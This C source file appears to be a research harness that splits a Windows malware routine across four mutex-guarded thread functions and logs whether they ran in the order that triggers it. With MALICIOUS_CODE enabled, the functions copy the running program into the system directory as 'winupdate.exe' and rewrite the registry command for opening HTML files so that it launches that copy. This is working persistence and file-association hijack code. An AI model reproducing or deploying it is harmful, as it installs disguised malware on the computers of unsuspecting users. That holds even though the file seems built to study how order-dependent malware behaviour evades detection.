#define WIN32_LEAN_AND_MEAN
#include <pthread.h>
// #include <shellapi.h>
#include <stdio.h>
#include <windows.h>

#include "bullmoose.h"

#ifndef BULLMOOSE_CPP
#define BULLMOOSE_CPP

#define MALICIOUS_CODE 1

static long LOOPS = 9120000;
static int sequence[100];
int sequenceOrder;
unsigned int order = 0;
pthread_mutex_t mutex;

static char OUTPUT_FILENAME[100] = "sequence.log";
static char IF_FILENAME[100] = "occurrence.log";

void recordMessage() {
  int i;
  FILE *fp;
  if ((fp = fopen(IF_FILENAME, "a+")) == NULL) {
    printf("can't open the file! \n");
  } else {
    if (order == 4) {
      fprintf(fp, "1\n");
    } else {
      fprintf(fp, "0\n");
    }
  }
  fclose(fp);

  if ((fp = fopen(OUTPUT_FILENAME, "a+")) == NULL) {
    printf("can't open the file! \n");
  } else {
    for (i = 0; sequence[i] != 0; i++) {
      fprintf(fp, "%d, ", sequence[i]);
    }
    fprintf(fp, "\n");
  }
  fclose(fp);
}

void malicious_start() {

  // OUTPUT_FILENAME = f;
  // LOOPS = atol(argv[4]);
  int i;
  for (i = 0; i < 100; i++) {
    sequence[i] = 0;
  }
  sequenceOrder = 0;
  pthread_mutex_init(&mutex, NULL);
}

void malicious_end() { recordMessage(); }

char MyPath[256];
char CpyPath[256];
HKEY Key32;

void malicious_1() {
  for (int i = 0; i < LOOPS; i++)
    ;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 1;
  if ((1 - order) == 1) {
    order = 1;
#if MALICIOUS_CODE
    GetModuleFileName(NULL, MyPath, sizeof(MyPath));
    GetSystemDirectory(CpyPath, sizeof(CpyPath));
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_2() {
  for (int i = 0; i < LOOPS; i++)
    ;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 2;
  if ((2 - order) == 1) {
    order = 2;
#if MALICIOUS_CODE
    strcat(CpyPath, "\\winupdate.exe");
    strcat(CpyPath, " %1");
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_3() {
  for (int i = 0; i < LOOPS; i++)
    ;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 3;
  if ((3 - order) == 1) {
    order = 3;
#if MALICIOUS_CODE
    CopyFile(MyPath, CpyPath, FALSE);
    RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0,
                 KEY_WRITE, &Key32);
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_4() {
  for (int i = 0; i < LOOPS; i++)
    ;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 4;
  if ((4 - order) == 1) {
    order = 4;
#if MALICIOUS_CODE
    RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
    RegCloseKey(Key32);
#endif
  }
  pthread_mutex_unlock(&mutex);
}

#endif // BULLMOOSE_CPP